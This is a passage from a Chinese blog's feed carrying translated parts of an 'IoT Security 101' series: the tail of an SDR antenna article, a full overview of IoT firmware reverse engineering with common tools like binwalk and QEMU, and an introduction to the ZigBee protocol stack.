<li><p>方向性和带宽<br>对于天线的主波束方向图，我们需要了解它在主瓣上有多少增益以及在旁瓣上提供了多少抑制。如果天线有一个很好的主瓣，在主瓣中截断了 3dB 并完全抑制了旁瓣，那么选择这样的天线是完全没问题的</p>
</li>
<li><p>有效长度<br>对于一些特殊的天线，如八木天线和对数周期天线，非常有必要选择合适的长度，这样天线才能在其中心频率以最大效率运行，并在其他频率下以最佳效率运行。</p>
</li>
</ul>
<p>根据要求和评估类型选择天线类型。下面是一些常用的 SDR 天线</p>
<ul>
<li>Telescopic (Stock antenna with most of the SDR transceivers)</li>
<li>Discone (Outdoor antenna)</li>
<li>Vertical (Outdoor antenna)</li>
<li>Yagi-Uda</li>
</ul>
<h2 id="结论">结论</h2><p>我们希望这能让您了解 RF 和 SDR 的世界。在这一部分中，我们涵盖了 SDR 评估所需的所有基础知识和硬件工具。在下一篇博客中，我们将介绍可用的软件工具，并了解实现目标的经典方法。</p>
<p><a href="/2021/09/23/IOT/iot-security-part-9-introduction-to-software-defined-radio/">继续下一部分 - 物联网安全 - 第 9 部分（软件无线电简介:软件部分）</a></p>
<h2 id="资源：">资源：</h2><p><a href="https://payatu.com/blog/Nitesh-Malviya/getting-started-with-radio-waves-hacking" target="_blank" rel="external">Getting started with Radio Hacking – Part 1 – Radio Frequency basics and theory</a><br><a href="https://payatu.com/blog/Nitesh-Malviya/getting-started-radio-hacking-part-2-listening-fm-using-rtl-sdr-gqrx" target="_blank" rel="external">Getting Started with Radio Hacking – Part 2 – Listening to FM using RTL-SDR and GQRX</a><br><a href="https://greatscottgadgets.com/sdr/" target="_blank" rel="external">SDR with HackRF by Michael ossmann</a><br><a href="https://www.youtube.com/user/IllinoisDSP/videos" target="_blank" rel="external">University of Illinois Digital signal processing series</a></p>
<p><em>原文链接：<a href="https://payatu.com/blog/appar/iot-security-%E2%80%93-part-8-introduction-to-software-defined-radio-sdr" target="_blank" rel="external">https://payatu.com/blog/appar/iot-security-%E2%80%93-part-8-introduction-to-software-defined-radio-sdr</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<div align="center"><br><img src="/img/sdr.png" align=""/><br></div>

<h2 id="介绍">介绍</h2><p>本文是“物联网安全”系列的一部分。如果您还没有阅读本系列之前的博客（第 1 - 7 部分），我建议您先阅读它们，除非您已经熟悉这些概念并且只想阅读当前主题。<br><a href="/2021/09/21/IOT/iot-security-part-1-101-iot-introduction-architecture/">物联网安全 - 第 1 部分（101 - 物联网介绍和架构）</a><br><a href="/2021/09/23/IOT/iot-security-part-7-reverse-engineering-an-iot-firmware/">物联网安全 - 第 7 部分（对 IoT 固件进行逆向工程）</a>本系列的前一篇博客。</p>]]>
    
    </summary>
    
      <category term="IOT安全" scheme="http://www.youngroe.com/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
      <category term="IOT" scheme="http://www.youngroe.com/categories/IOT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[物联网安全101-7.物联网固件逆向（翻译）]]></title>
    <link href="http://www.youngroe.com/2021/09/23/IOT/iot-security-part-7-reverse-engineering-an-iot-firmware/"/>
    <id>http://www.youngroe.com/2021/09/23/IOT/iot-security-part-7-reverse-engineering-an-iot-firmware/</id>
    <published>2021-09-23T12:50:22.000Z</published>
    <updated>2021-11-09T15:10:00.452Z</updated>
    <content type="html"><![CDATA[<div align="center"><br><img src="/img/motherboard.jpg" align><br></div>

<h2 id="固件逆向工程：简介">固件逆向工程：简介</h2><p>本文是“物联网安全”系列的一部分。如果您还没有阅读本系列之前的文章（第 1 部分到第 6 部分），我强烈建议您先阅读它们，除非您已经熟悉这些概念并且只想阅读当前主题。<br><a href="/2021/09/21/IOT/iot-security-part-1-101-iot-introduction-architecture/">物联网安全 - 第 1 部分（101 - 物联网介绍和架构）</a><br><a href="/2021/09/22/IOT/iot-security-part-6-101-zigbee-security-101/">物联网安全 - 第 6 部分 (ZigBee 安全 - 101)</a>本系列上一篇博客。</p>
<p>固件是物联网设备的软件部分。构建功能性物联网固件涉及许多技术，有许多厂商为这些技术的开发做出贡献，如 Cisco、Linux、Wind River 等。在这篇文章中，当我说固件时，我将主要是指设备的软件组件。固件具有不同的复杂性，从驱动功能较弱的微型微控制器的裸机固件到基于微处理器的成熟操作系统，如 Linux。后者用于更复杂的设备，如路由器、电视等。</p>
<a id="more"></a>
<p>在这篇文章中，我们将研究组成固件所涉及的不同组件，然后我们将讨论如何使用各种开源工具对固件进行逆向工程。逆向是一个重要的步骤，它将帮助您对设备和固件进行进一步的分析。那么让我们开始看看裸机固件是什么？</p>
<h2 id="裸机固件（Bare_Metal_Firmware）">裸机固件（Bare Metal Firmware）</h2><p>根据设备的需要使用的应用程序，决定设备使用的技术栈。如果一个设备的任务是读取和报告周围温度和湿度，那么它不需要非常复杂的软件，比如 Linux。对于这些情况，就可以使用裸机固件。现在，您可能会问什么是裸机固件？简单来说，这类固件直接与硬件接口直接进行交互，不涉及驱动程序或内核。</p>
<p>裸机固件不会做太多复杂的事情，它们通常被分配不超过 3 或 4 个任务，这些任务被放入循环中，因为它们被安排在特定的顺序/条件下运行。厂商会为这些设备提供的 SDK 提供了生命周期方法，程序员编写的这些函数在循环中运行。这些 SDK 的一些复杂功能变体是 FreeRTOS、mbed-os，它们是实时操作系统，允许您进行任务调度并对某些中断请求做出非常快速的响应。</p>
<p>裸机固件是用 C 编写的，因此所有针对C语言的攻击（如缓冲区溢出相关漏洞）也对这些固件有效。这些设备通常收集数据并将其发送到中央服务器或与通过 UART/SPI 总线（其外围设备）与其他设备进行通信。有机会发现通信协议中的漏洞、错误处理数据包、密钥交换、缓冲区溢出等。</p>
<p>基于裸机固件的微控制器设备不仅用于传感器网络；它们无处不在，从冰箱、微波炉、安全警报系统，您的汽车上有几十个，您的笔记本电脑/电脑也是如此。通常，当您没有此固件的源代码时，您会采用逆向工程的方法。</p>
<p>逆向这些二进制文件与逆向 Windows EXE 和 Linux ELF 文件有点不同。那么它们就没有预定义的结构。对于裸机二进制文件，您需要芯片组的数据表（data-sheet ）并在您的反汇编工具（如 IDA、Ghidra 等）中创建内存映射，以进行正确的反汇编。另一个非常关键的问题 memory-map 也可以帮助用户回答是什么 GPIO，设备与其他外设进行交互？此信息将有助于了解设备的功能。关于这一点还有很多可以说的，我会在另一篇文章中说明，因此有关更多详细信息，请访问此<a href="https://payatu.com/blog/asmita-jha/--stack-smashing--protection-in-hardware-attack" target="_blank" rel="external">链接</a>。现在让我们看看什么是成熟的基于操作系统的固件。</p>
<h2 id="成熟操作系统固件">成熟操作系统固件</h2><p>当您看到更复杂的系统（如路由器、智能家居仪表板、无人机和医疗保健设备）时，它们的作用与裸机系统无异。举个例子；典型的无线路由器具有通过局域网和WIFI连接等功能；他们可以将指定的 MAC 地址列入黑名单/白名单，并且一些现代路由器具有防病毒软件和其他保护功能。要实现所有这些功能，您需要一个成熟的操作系统来支持所有这些复杂的功能。</p>
<p>嵌入式系统有许多不同的操作系统选项，如 Linux、Windows CE、Cisco IOS、Symbian、Android、VxWorks 等。其中一些是专用的，如用于路由器的 Cisco，而大多数是更通用的。一般统计数据表明，嵌入式系统产品中最受欢迎的操作系统选择是 Linux。造成这种情况的原因有很多，其中一些原因是它的开源特性、灵活性，最重要的是，它是免费的。您可以在周围找到 Linux 驱动的设备，例如路由器、信息娱乐系统等。</p>
<p>这种固件通常至少包含三个组件，引导加载程序 Bootloader、内核 Kernel 和文件系统 file-system。引导加载程序是帮助加载操作系统内核并传递各种信息需求的软件。一旦引导加载程序完成加载，内核就将接管执行。一旦内核开始执行，它就会启动其他用户应用程序以使最终用户可以使用操作系统。这通常涉及在后台启动各种应用程序和服务。完成所有这些后，用户就可以与系统进行交互。所有用户应用程序和应用程序数据都存储在文件系统上。</p>
<p>这些设备的安全评估通常从审核这些设备上运行的应用程序开始；最有趣的目标是远程应用服务程序。在这些服务程序中发现的漏洞对设备的安全性有很大影响，因为攻击者不需要靠近它就可以破坏它。如果互联网上的任何人可以利用该漏洞，他们都可以控制它。这些服务通常是用于配置和控制设备功能或其他服务（如 UPnP）的 Web 服务器，这些服务有助于其他设备发现该设备。</p>
<h2 id="固件分析安全工具">固件分析安全工具</h2><p>既然我们对固件的整体有了一个高层次的概述，那么您想到的下一个问题是如何开始剖析固件并开始分析固件。分析大致可以分为静态分析和动态分析。在静态分析中，您阅读代码并查找错误，如果您没有源代码，请开始对二进制文件进行逆向工程并阅读汇编说明以了解其功能。另一方面，动态分析涉及运行应用程序并观察其行为。<br>在分析固件时，我通常结合使用这两种分析技术来实现我的目标。以下是我经常使用的一些工具的列表：</p>
<ul>
<li>Binwalk - 这可能是最流行的固件解包工具之一。它是一个固件提取工具，它试图在任何二进制 blob 中提取二进制文件。它通过搜索许多常见二进制文件格式（如 zip、tar、exe、ELF 等）的签名来实现这一点。 Binwalk 拥有二进制文件头签名数据库，可以根据该数据库完成签名匹配。使用此工具的共同目标是提取嵌入在固件二进制文件中的文件系统，如 Squashfs、yaffs2、Cramfs、ext*fs、jffs2 等。文件系统包含将在设备上运行的所有应用程序代码。此工具还有许多参数，您可以调整这些参数以更好地进行提取。您可以访问此<a href="https://github.com/ReFirmLabs/binwalk/wiki/Usage" target="_blank" rel="external">链接</a>以阅读有关什么是不同参数以及如何使用它们的更多详细信息。</li>
<li>Qemu - 对于在跨架构（如 ARM、MIPS 等）环境中工作的人来说，这是一个有价值的工具，嵌入式开发人员通常就是这种情况。该工具提供了一种在主机系统上模拟不同架构（如 ARM、MIPS 等）的二进制固件的方法，主机系统具有不同的架构，如 x86、amd64。当您想审核固件但没有设备或为该系统设置调试器非常困难时，这种工具非常方便。Qemu 可以帮助您对 Linux 系统和许多不同平台进行全系统仿真或 ELF 文件的单个二进制仿真。您可以查看此<a href="https://www.qemu.org/" target="_blank" rel="external">链接</a>以获取有关该项目的更多详细信息。</li>
<li>gdb-multiarch - GDB 是一种动态调试工具，用于中断正在运行的进程并检查其内存和寄存器。但是，gdb 只支持编译它的体系结构。但是当你要调试不同架构的应用程序进行跨架构支持时，你会需要它的姊妹项目gdb-multiarch，它可以帮助你进行跨架构调试。</li>
<li>Firmware ModKit - 此工具可帮助您Patch固件并重新打包。它使用 Binwalk 提取固件，并为您提供一个包含固件文件系统布局的目录。然后，您可以根据需要Patch任何内容，添加/删除文件或修补现有文件，ModKit 可以将其打包备份，以便您可以在设备存储上刷新新固件并启动新修补的固件。您可以从此<a href="https://code.google.com/archive/p/firmware-mod-kit/" target="_blank" rel="external">链接</a>下载此工具的代码。</li>
</ul>
<p>我分析固件时的工作流程涉及所有这些工具。第一步通常从使用 Binwalk 解压固件开始。接下来，尝试使用 Qemu 模拟固件中感兴趣的应用程序。如果我无法模拟二进制文件，那么我会通过 gdb 调试并发现问题然后修复，以便 Qemu 可以运行它并查找安全问题。通过这个步骤还帮助我对服务进行模糊测试。</p>
<h2 id="结论">结论</h2><p>本文阐述了固件是什么，以及在评估 IoT 设备时您会遇到哪些不同类型的 IoT 固件。我向您概述了如何处理不同类型的固件，我们还研究了不同的工具如何帮助我们对固件进行安全分析。</p>
<p>继续下一部分 -<a href="/2021/09/23/IOT/iot-security-part-8-introduction-to-software-defined-radio-sdr/">物联网安全 - 第 8 部分 软件无线电（Software Defined Radio，SDR）简介</a></p>
<p><em>原文链接：<a href="https://payatu.com/blog/munawwar/iot-security---part-7-reverse-engineering-an-iot-firmware" target="_blank" rel="external">https://payatu.com/blog/munawwar/iot-security---part-7-reverse-engineering-an-iot-firmware</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<div align="center"><br><img src="/img/motherboard.jpg" align=""/><br></div>

<h2 id="固件逆向工程：简介">固件逆向工程：简介</h2><p>本文是“物联网安全”系列的一部分。如果您还没有阅读本系列之前的文章（第 1 部分到第 6 部分），我强烈建议您先阅读它们，除非您已经熟悉这些概念并且只想阅读当前主题。<br><a href="/2021/09/21/IOT/iot-security-part-1-101-iot-introduction-architecture/">物联网安全 - 第 1 部分（101 - 物联网介绍和架构）</a><br><a href="/2021/09/22/IOT/iot-security-part-6-101-zigbee-security-101/">物联网安全 - 第 6 部分 (ZigBee 安全 - 101)</a>本系列上一篇博客。</p>
<p>固件是物联网设备的软件部分。构建功能性物联网固件涉及许多技术，有许多厂商为这些技术的开发做出贡献，如 Cisco、Linux、Wind River 等。在这篇文章中，当我说固件时，我将主要是指设备的软件组件。固件具有不同的复杂性，从驱动功能较弱的微型微控制器的裸机固件到基于微处理器的成熟操作系统，如 Linux。后者用于更复杂的设备，如路由器、电视等。</p>]]>
    
    </summary>
    
      <category term="IOT安全" scheme="http://www.youngroe.com/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
      <category term="IOT" scheme="http://www.youngroe.com/categories/IOT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[物联网安全101-5.ZigBee协议（翻译）]]></title>
    <link href="http://www.youngroe.com/2021/09/22/IOT/iot-security-part-5-101-zigbee-protocol-101/"/>
    <id>http://www.youngroe.com/2021/09/22/IOT/iot-security-part-5-101-zigbee-protocol-101/</id>
    <published>2021-09-22T14:50:22.000Z</published>
    <updated>2021-11-07T13:37:47.701Z</updated>
    <content type="html"><![CDATA[<h2 id="ZigBee_协议_101">ZigBee 协议 101</h2><p>该博客是“物联网安全”系列的一部分。如果您还没有阅读本系列之前的博客（第 1-4 部分），我建议您先阅读它们，除非您已经熟悉这些概念并且只想阅读当前主题。<br><a href="/2021/09/21/IOT/iot-security-part-1-101-iot-introduction-architecture/">物联网安全 - 第 1 部分（101 - 物联网介绍和架构）</a><br><a href="/2021/09/22/IOT/iot-security-part-4-bluetooth-low-energy-101/">物联网安全 - 第 4 部分（蓝牙低能耗）</a><br>在这篇博客中，我们将详细讨论 ZigBee 规范和 ZigBee 协议架构。下一篇博客将介绍 ZigBee 协议的安全架构以及 ZigBee 设备和网络中存在的安全问题。<br><a id="more"></a></p>
<h2 id="历史">历史</h2><p>ZigBee – 在 1990 年代作为临时数字无线电网络开发并替代有线网络。与 Wi-Fi 或蓝牙不同，ZigBee 更适用于工业自动化和控制系统 (IACS) 中的应用，在这些应用中，终端节点需要定期传输少量数据，并且功耗低，并且与计算机的传输距离较短，集中监控系统。如今，ZigBee 低速率无线个域网 (LR-WPAN) 广泛用于需要低数据速率、长电池寿命、自愈能力和嘈杂射频环境中安全网络的控制和监控应用。以下是一些在其产品中使用 ZigBee 标准作为网络解决方案的行业</p>
<ul>
<li><ol>
<li>无线传感器网络（WSN）</li>
</ol>
</li>
<li><ol start="2">
<li>工业自动化</li>
</ol>
</li>
<li><ol start="3">
<li>楼宇自动化</li>
</ol>
</li>
<li><ol start="4">
<li>家庭自动化</li>
</ol>
</li>
<li><ol start="5">
<li>智能电能计量</li>
</ol>
</li>
<li><ol start="6">
<li>医院和医疗保健自动化</li>
</ol>
</li>
</ul>
<h2 id="ZigBee_概述">ZigBee 概述</h2><div align="center"><br><img src="/img/zigbeeicon1.png" align><br></div>

<p>2000 年，IEEE 802.15 工作组成立，致力于制定无线个域网 (WPAN) 或无线个域网 (WPAN) 的标准，其特点是短距离、高度简单、允许低成本和低功耗实施。IEEE 802.15.4标准第一版于2003年发布，即IEEE 802.15.4-2003（LR-WPAN），定义了OSI模型的物理层和数据链路层。2002 年 ZigBee 联盟成立并与 IEEE 802.15.4 工作组合作，于 2004 年 12 月宣布 ZigBee v.1.0 草案批准 ZigBee 2004 规范。 ZigBee 标准建立在 IEEE 802.15.4 标准之上，其中 IEEE 802.15.15定义了前两层，即物理（PHY）层、低速率无线个域网（LR-WPAN）的媒体访问控制（MAC）层，ZigBee标准提供了网络层（NWK），<br>以下部分将更详细地说明 ZigBee 标准的不同组件</p>
<h3 id="IEEE_802-15-4_协议">IEEE 802.15.4 协议</h3><h3 id="物理层">物理层</h3><p>IEEE 802.15.4 物理层提供数据、传输和接收管理服务的调制解调，并在两个独立的频率范围内运行，低频868 ⁄ 915 MHz 和高频 2.4 GHz。物理层层负责无线电控制（启用/禁用）、接收数据包的链路质量指示 (LQI)、能量检测 (ED) 和空闲信道评估 (CCA)</p>
<table>
<thead>
<tr>
<th>物理层</th>
<th>频率</th>
<th>频道</th>
<th>地区</th>
</tr>
</thead>
<tbody>
<tr>
<td>低频物理层</td>
<td>868.0-868.6 兆赫</td>
<td>1</td>
<td>欧洲</td>
</tr>
<tr>
<td>低频物理层</td>
<td>902-928 兆赫</td>
<td>30</td>
<td>美国和澳大利亚</td>
</tr>
<tr>
<td>高频物理层</td>
<td>2400-2483.5MHZ</td>
<td>16</td>
<td>全世界</td>
</tr>
</tbody>
</table>
<h3 id="MAC层">MAC层</h3><p>IEEE 802.15.4 MAC 层使用 CSMA-CA 机制控制对无线电信道的访问。MAC层负责Beacon传输（当设备为协调器时），实现载波侦听多路访问与冲突避免（CSMA-CA），使用保证时隙（GTS）机制进行同步，为上层提供可靠的传输机制.</p>
<h3 id="IEEE_802-15-4_网络模型">IEEE 802.15.4 网络模型</h3><h4 id="节点类型">节点类型</h4><p>IEEE 802.15.4 标准定义了两种类型的网络节点</p>
<ul>
<li><p>全功能设备 (FFD)<br>FFD 设备能够在 PAN 网络内创建网络、配置和消息路由。FFD 设备能够在 PAN 网络中配置安全模型。FFD 设备可以在三种操作模式下运行，即：PAN 协调器、协调器和终端设备。FFD 设备可以与网络中的任何 RFD 或 FFD 设备进行通信。</p>
</li>
<li><p>缩减功能器件 (RFD)<br>RFD 通常是一种电池供电的简单设备，资源和通信要求非常适中。由于缺乏路由能力，RFD 设备只能作为 PAN 网络中的终端设备，并且只能与网络中的 FFD 设备进行通信。</p>
</li>
</ul>
<h4 id="拓扑">拓扑</h4><p>IEEE 802.15.4 标准为 LR-WPAN 设备定义了两种星型或点对点网络拓扑。但是，每个网络都需要至少一个 FFD 作为网络的协调器。</p>
<div align="center"><br><img src="/img/ieee-topology.png" align><br></div>

<ul>
<li><p>星型网络<br>星型网络是一种更加结构化的网络，网络中至少有一个 FFD 设备充当整个网络的协调器。任何 FFD 设备都会选择其唯一的 PAN 标识符来创建自己的 PAN 并将自己声明为 PAN 协调器。一旦 PAN 协调器在网络中处于活动状态，其他终端设备就可以加入网络。终端设备只能与中央节点或协调器通信。它主要用于家庭自动化、个人健康监测、玩具和游戏控制。</p>
</li>
<li><p>点对点<br>对等网络也需要一个 PAN 协调器，但与星型网络不同，任何设备都可以与网络范围内的任何其他设备进行通信。对等网络可以是能够自组织和自管理的自组织网络。它主要用于工业控制和监控系统、无线传感器网络、库存管理系统。</p>
</li>
</ul>
<h3 id="节点寻址模式">节点寻址模式</h3><p>每个 IEEE 802.15.4 都有两种寻址模式，短（16 位）和扩展（64 位）寻址。符合 IEEE 802.15.4 的设备从制造商处获取其 64 位扩展地址，而当设备与 WPAN 关联时，协调器会分配一个唯一的 16 位 PAN 地址。</p>
<h2 id="ZigBee_协议">ZigBee 协议</h2><div align="center"><br><img src="/img/zigbee-stack.png" align><br></div>

<p>来源：<a href="https://zigbeealliance.org/wp-content/uploads/2019/11/docs-05-3474-21-0csg-zigbee-specification.pdf" target="_blank" rel="external">ZigBee 规范文档 05-3474-21（docs-05-3474-21-0csg-zigbee-specification）</a></p>
<h3 id="应用层">应用层</h3><p>如上图所示，APL 层由几个子层组成，即：APS 子层、服务接入点（SAP）和 ZigBee 设备对象（ZDO）以及 ZDO 管理平面，以及制造商定义的应用程序对象。</p>
<h3 id="应用支持子层_(APS)">应用支持子层 (APS)</h3><p>APS 子层通过 ZDO 和制造商定义的应用程序对象使用的一组通用服务提供 NWK 和 APL 之间的接口。APS 数据实体 (APS-DE) 和 APS 管理实体 (APS-ME) 是两个 APS 实体，提供以下服务：</p>
<ul>
<li><strong>APS 数据实体 (APS-DE)</strong></li>
<li>应用支持子层协议数据单元（APDU）的生成</li>
<li>设备绑定</li>
<li>组地址过滤</li>
<li>可靠的运输</li>
<li>重复拒绝</li>
<li><p>碎片化</p>
</li>
<li><p><strong>APS 管理实体 (APM-SE)</strong></p>
</li>
<li>绑定管理</li>
<li>应用支持层信息库（AIB）管理</li>
<li>安全</li>
<li>集团管理</li>
</ul>
<h3 id="应用框架">应用框架</h3><p>应用程序框架提供了一个执行环境，其中托管应用程序对象并可以发送或接收数据，最多可以定义 254 个不同的应用程序对象，每个应用程序对象由一个从 1 到 254 的端点地址标识。端点 0 和端点 255 用作 ZigBee 设备对象（ZDO）地址和广播地址分别由应用支持子层数据实体-服务接入点（APSDE-SAP）端点241至254由ZigBee联盟保留，未经批准不得使用。</p>
<ul>
<li><p>应用配置文件<br>应用程序配置文件是消息、消息格式和处理操作的协议，使开发人员能够使用驻留在不同设备上的应用程序实体来创建可互操作的分布式应用程序。ZigBee 联盟已经为家庭自动化、工业自动化等应用发布了大量公共应用配置文件。设备制造商还可以定义适合其最终应用的自定义配置文件。</p>
</li>
<li><p>集群<br>集群表示为属性和应用程序消息的集合。簇分为两种类型，即输入簇和输出簇。群集标识符是在特定应用程序配置文件范围内唯一的 16 位数字。</p>
</li>
</ul>
<h3 id="ZigBee_设备对象_(ZDO)">ZigBee 设备对象 (ZDO)</h3><p>位于应用程序框架和 APS 之间的 ZigBee 设备对象 (ZDO) 表示功能的基类，它提供应用程序对象、设备配置文件和 APS 之间的接口。ZDO 负责以下事项：</p>
<ul>
<li>初始化应用程序支持子层 (APS)、网络层 (NWK) 和安全服务。</li>
<li>收集来自终端应用程序的配置信息以确定和实施发现、安全管理（密钥加载、密钥建立、密钥传输和身份验证）、网络管理（网络发现、离开/加入网络、重置网络连接和创建网络） 、绑定、节点和组管理。</li>
</ul>
<h3 id="网络层">网络层</h3><p>网络层在 802.15.4 MAC 层和应用层之间提供服务接口。网络层数据实体 (NLDE) 和网络层管理实体 (NLME) 是两个网络层实体，提供以下服务：</p>
<ul>
<li><strong>网络层数据实体 (NLDE)</strong></li>
<li>网络级 PDU (NPDU) 的生成</li>
<li>特定于拓扑的路由</li>
<li><p>安全</p>
</li>
<li><p><strong>网络层管理实体 (NLME)</strong></p>
</li>
<li>配置新设备</li>
<li>启动网络</li>
<li>加入、重新加入和离开网络</li>
<li>寻址：</li>
<li>邻居发现</li>
<li>路由发现</li>
<li>接收控制</li>
<li>路由</li>
</ul>
<h2 id="ZigBee_设备类型">ZigBee 设备类型</h2><p>ZigBee 设备可以在三种不同的模式或节点类型下工作。</p>
<ul>
<li><p>ZigBee 协调器 (ZC)<br>ZigBee 协调器是一种 FFD 设备，充当网络中其他节点的中央节点或父节点。每个网络只有一个负责 ZigBee 网络的创建、配置和管理。它维护一个关联设备列表，支持关联、解除关联和孤儿扫描、重新加入等服务。没有 ZC，ZigBee 网络就无法存在；ZC 在网络上始终处于活动状态，不能进入睡眠模式。</p>
</li>
<li><p>ZigBee 路由器 (ZR)<br>ZigBee 路由器是一个中间 FFD 设备，负责在终端设备之间或终端设备与协调器之间中继数据包。终端设备也可以通过路由器加入网络，ZR 充当该网络段的父节点。</p>
</li>
<li><p>ZigBee 终端设备 (ZED)<br>任何 FFD 或 RFD 设备都可以成为 ZigBee 网络上的终端设备，ZigBee 终端设备是一个简单的设备，如传感器，负责监控和收集数据，或根据用户的特定操作执行命令。没有任何消息路由能力的 ZED 只能从父节点发送和接收数据。通常，ZED 是低功率电池供电设备，可以将其置于睡眠状态以节省功耗。</p>
</li>
</ul>
<h2 id="网络拓扑结构">网络拓扑结构</h2><p>ZigBee 网络层 (NWK) 支持星形、树形和网状拓扑。</p>
<div align="center"><br><img src="/img/zigbee-topology.png" align><br></div>

<ul>
<li><p>星形<br>每个网络的单个 ZigBee 协调器设备，控制网络，并负责启动和维护 ZigBee 网络。所有其他设备，称为终端设备，通过 ZigBee 协调器直接与 ZigBee 协调器或其他终端设备通信。在星型网络中，协调器成为消息路由的瓶颈，协调器故障导致网络关闭。</p>
</li>
<li><p>树形<br>在树形拓扑结构中，ZigBee 协调器负责启动网络并选择特定的关键网络参数，但网络可以通过 ZigBee 路由器进行扩展。在树形网络中，路由器使用树形路由策略通过网络路由数据和控制消息。在 Tree 网络中，路由器故障会导致受影响路由器下的网段关闭。</p>
</li>
<li><p>网状拓扑<br>在网状拓扑中，ZigBee 协调器负责创建和配置，但网络可以使用 ZigBee 路由器进行扩展。网状网络允许完全对等通信。网状网络，也称为自愈网络，即协调器故障不会导致网络故障，因为终端设备相互通信以及与路由器通信。<br>网状网络很复杂，并且会在网络中产生消息传递开销。</p>
</li>
</ul>
<h2 id="ZigBee_中的寻址">ZigBee 中的寻址</h2><h3 id="设备寻址">设备寻址</h3><p>ZigBee 网络中的每个 ZigBee 设备都有两种类型的地址 - IEEE 地址和网络地址。</p>
<ul>
<li><p>IEEE 地址<br>全球唯一的 64 位地址，由设备制造商在生产期间分配。作为 IEEE 802.15.4 标准的一部分，该地址也被称为“扩展地址”，被 IEEE 802.15.4 层用于低级数据包传递，除了绑定映射需要在两者之间创建绑定外，ZigBee 层很少使用IEEE 地址和网络地址。</p>
</li>
<li><p>网络地址<br>ZigBee 网络中唯一的 16 位网络地址是 ZigBee 层的一部分，也称为“短地址”。网络地址分配给终端设备，并由网络层用于在设备之间路由消息。</p>
</li>
</ul>
<h3 id="ZigBee_网络身份">ZigBee 网络身份</h3><p>ZigBee 网络中的每个 ZigBee 设备都获得两种类型的标识符 (ID) - 个人区域网络标识符 (PAN ID) 和扩展 PAN ID (EPID)。</p>
<ul>
<li><p>PAN 标识符（PAN ID）<br>作为 IEEE 802.15.4 标准的一部分，PAN 标识符 (PAN ID) 是一个 16 位标识符，由 PAN 协调器在设置网络并与终端设备通信时选择。MAC 层过滤掉来自其他网络的数据包，这些网络不是由特定 PANID 标识的同一网络的一部分。</p>
</li>
<li><p>扩展 PAN ID (EPID)<br>ZigBee 网络的全球唯一 64 位标识符，EPID 标识符在给定区域内重叠的 PAN 中应该是唯一的，用于避免不同网络之间的 PAN ID 冲突。有关 PAN ID、EPAN 和短地址的更多信息，请参阅下面的 ZigBee 数据包快照</p>
</li>
</ul>
<div align="center"><br><img src="/img/zigbee-node-addressing.png" align><br></div>

<h3 id="应用级寻址">应用级寻址</h3><ul>
<li><p>端点地址<br>每个 ZigBee 节点可以支持一个或多个应用程序或端点。要将直接消息发送到特定应用程序，使用编号为 1 到 240 的端点 - 还有一个广播端点 255，它允许将消息发送到给定节点上的所有应用程序。</p>
</li>
<li><p>集群标识符（集群 ID）<br>集群标识符是在每个应用程序配置文件范围内唯一的 16 位数字，用于标识特定的集群。请参阅下面的 ZigBee 数据包快照，以进一步了解端点地址和集群 ID</p>
<div align="center"><br><img src="/img/zb-application-addressing.png" align><br></div>

</li>
</ul>
<h2 id="ZigBee_中的消息传递">ZigBee 中的消息传递</h2><p>ZigBee 支持广播、单播、组多播和跨 PAN 消息传递。</p>
<ul>
<li><p>广播<br>由 PAN 协调器发起的消息，用于 PAN 网络中的所有设备和路由器设备，路由器将其转发给属于同一 PAN 网络的终端节点。</p>
</li>
<li><p>单播<br>消息指向网络中的单个终端节点，通常通过多个节点路由到达目的地节点。单播消息需要从最终目标设备到源设备的网络级确认，而如果消息路由通过不同的节点，则在 MAC 层之间发送 MAC 级确认。</p>
</li>
<li><p>组播<br>用于特定 PAN 网络中的每个设备的消息，属于以跳数为单位的给定传输半径内动态定义的多播组。</p>
</li>
</ul>
<h3 id="PAN_间通信">PAN 间通信</h3><p>此消息适用于来自具有不同 PANID 的不同 PAN 网络的设备。ZigBee 规范将跨泛通信定义为一种机制，通过这种机制，ZigBee 设备可以与本地区域内的设备进行信息交换，而无需形成或加入相同的 ZigBee 网络。</p>
<h2 id="结论…">结论…</h2><p>我们希望这能让您对 ZigBee 协议进行介绍和简要了解。在下一篇博客中，我们将介绍 ZigBee 协议和设备的安全性。<br>继续阅读本系列的下一部分 -<a href="/2021/09/22/IOT/iot-security-part-6-101-zigbee-security-101/">物联网安全第 6 部分（ZigBee 安全 - 101）</a></p>
<h2 id="参考">参考</h2><ul>
<li><ol>
<li><a href="https://standards.ieee.org/standard/802_15_4-2020.html" target="_blank" rel="external">802.15.4-2020 - IEEE 批准的低速率无线网络标准草案</a></li>
</ol>
</li>
<li><ol start="2">
<li><a href="https://zigbeealliance.org/wp-content/uploads/2019/11/docs-05-3474-21-0csg-zigbee-specification.pdf" target="_blank" rel="external">ZigBee 规范 - 05-3474-21，2015 年 8 月 5 日</a></li>
</ol>
</li>
<li><ol start="3">
<li><a href="http://www.zigbee.org/" target="_blank" rel="external">ZigBee 联盟</a></li>
</ol>
</li>
<li><ol start="4">
<li><a href="https://en.wikipedia.org/wiki/IEEE_802.15.4" target="_blank" rel="external">IEEE 802.15.4 维基百科</a></li>
</ol>
</li>
<li><ol start="5">
<li><a href="https://en.wikipedia.org/wiki/Zigbee" target="_blank" rel="external">ZigBee 维基百科</a></li>
</ol>
</li>
</ul>
<p><em>原文链接：<a href="https://payatu.com/blog/dattatray/zigbee-protocol-101" target="_blank" rel="external">https://payatu.com/blog/dattatray/zigbee-protocol-101</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="ZigBee_协议_101">ZigBee 协议 101</h2><p>该博客是“物联网安全”系列的一部分。如果您还没有阅读本系列之前的博客（第 1-4 部分），我建议您先阅读它们，除非您已经熟悉这些概念并且只想阅读当前主题。<br><a href="/2021/09/21/IOT/iot-security-part-1-101-iot-introduction-architecture/">物联网安全 - 第 1 部分（101 - 物联网介绍和架构）</a><br><a href="/2021/09/22/IOT/iot-security-part-4-bluetooth-low-energy-101/">物联网安全 - 第 4 部分（蓝牙低能耗）</a><br>在这篇博客中，我们将详细讨论 ZigBee 规范和 ZigBee 协议架构。下一篇博客将介绍 ZigBee 协议的安全架构以及 ZigBee 设备和网络中存在的安全问题。<br>]]>
    
    </summary>
    
